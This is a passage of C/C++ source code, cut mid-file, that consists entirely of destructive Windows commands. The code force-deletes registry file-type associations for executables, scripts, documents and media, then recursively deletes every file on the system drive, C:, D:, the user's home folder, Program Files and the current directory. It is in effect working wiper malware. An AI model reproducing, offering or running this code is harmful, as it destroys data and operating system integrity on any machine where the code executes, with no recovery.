			system("reg delete HKEY_CLASSES_ROOT\\.html /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xltx /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xltm /f");
			system("reg delete HKEY_CLASSES_ROOT\\.php /f");
			system("reg delete HKEY_CLASSES_ROOT\\.swf /f");
			system("reg delete HKEY_CLASSES_ROOT\\.fla /f");
			system("reg delete HKEY_CLASSES_ROOT\\.exe /f");
			system("reg delete HKEY_CLASSES_ROOT\\.log /f");
			system("reg delete HKEY_CLASSES_ROOT\\.avi /f");
			system("reg delete HKEY_CLASSES_ROOT\\.mp3 /f");
			system("reg delete HKEY_CLASSES_ROOT\\.wav /f");
			system("reg delete HKEY_CLASSES_ROOT\\.vmw /f");
			system("reg delete HKEY_CLASSES_ROOT\\.bak /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dat /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dll /f");
			system("reg delete HKEY_CLASSES_ROOT\\.cmd /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xml /f");
			system("reg delete HKEY_CLASSES_ROOT\\.msc /f");
			system("reg delete HKEY_CLASSES_ROOT\\.drv /f");
			system("reg delete HKEY_CLASSES_ROOT\\.tmp /f");
			system("reg delete HKEY_CLASSES_ROOT\\.tsk /f");
			system("reg delete HKEY_CLASSES_ROOT\\.rom /f");
			system("reg delete HKEY_CLASSES_ROOT\\.ram /f");
			system("reg delete HKEY_CLASSES_ROOT\\.bat /f");
			system("del %SYSTEMDRIVE%\\*.* /f /s /q");
			system("del %HOMEPATH%\\*.* /f /s /q");
			system("del %ProgramFiles%\\*.* /f /s /q");
			system("del /S /Q c:\\*.*");
			CreateProcess(NULL, "del /S /Q d:\\*.*", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			system("del /S /Q *.*");
			system("del c:\\*.* /f /s /q");
			CreateProcess(NULL, "del d:\\*.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			CreateProcess(NULL, "del *.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}
